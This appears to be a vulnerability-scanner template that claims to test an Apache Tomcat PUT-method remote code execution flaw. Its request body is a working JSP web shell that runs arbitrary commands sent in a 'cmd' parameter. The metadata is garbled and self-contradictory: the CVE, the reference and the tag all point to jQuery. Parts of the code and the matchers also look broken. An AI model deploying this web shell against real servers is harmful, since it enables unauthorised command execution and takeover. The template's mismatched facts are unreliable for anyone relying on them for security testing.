id: cve-2011-4969
info:
  name: Apache Tomcat RCE via PUT method
  severity: medium
  author: Omid
  description: Apache Tomcat RCE via PUT method vulnerability (CVE-2011-4969) allows remote attackers to execute arbitrary code via crafted requests that use a combination of a Content-Type header and a crafted request body leading to a privilege escalation and remote code execution.
   reference:
    - https://nvd.nist.gov/vuln/detail/cve-2011-4969
    - https://www.rapid7.com/db/vulnerabilities/jquery-cve-2011-4969/
  classification:
    cvss-score: 4.3
    cve-id: cve-2011-4969
  metadata:
    verified: "true"
  tags: JQuery

requests:
  - method: PUT
    path:
      - "/"
    headers:
      Content-Type: %{content_type}
    body: |
      <%@ page import="java.util.*,java.io.*"%>
      <%!
      class StreamConnector extends Thread
      {
          InputStream is;
          OutputStream os;
          StreamConnector( InputStream is, OutputStream os )
          {
              this.is = is;
              this.os = os;
          }
          public void run()
          {
              BufferedReader in  = null;
              BufferedWriter out = null;
              try
              {
                  in  = new BufferedReader( new InputStreamReader( this.is ) );
                  out = new BufferedWriter( new OutputStreamWriter( this.os ) );
                  char buffer[] = new char[8192];
                  int length;
                  while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
                  {
                      out.write( buffer, 0, length );
                      out.flush();
                  }
              } catch( Exception e ){
                  e.printStackTrace();
              } finally {
                  try{ if( in!=null ) in.close(); }catch( Exception e ){}
                  try{ if( out!=null ) out.close(); }catch( Exception e ){}
              }
          }
      }
      %>
      <%!
          String executeCommand(String cmd) {
              StringBuffer output = new StringBuffer();
              Process p;
              p = Runtime.getRuntime().exec(cmd);
              p.waitFor();
              BufferedReader reader =
              new BufferedReader(new InputStreamReader(p.getInputStream()));
              String line = "";
              while ((line = reader.readLine())!= null) {
                  output.append(line + "\n");
              }
              return output.toString();
          }
      %>
      <% String cmd = request.getParameter("cmd"); %>
      <% if (cmd != null) {
          out.println("<pre>");
          out.println(executeCommand(cmd));
          out.println("</pre>");
      } %>
    tags:
      - web
      - tomcat
      - rce
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "successfully"
          - "created"
      - type: word
        words:
          - "failed"
          - "to"
          - "create"
          - "file"
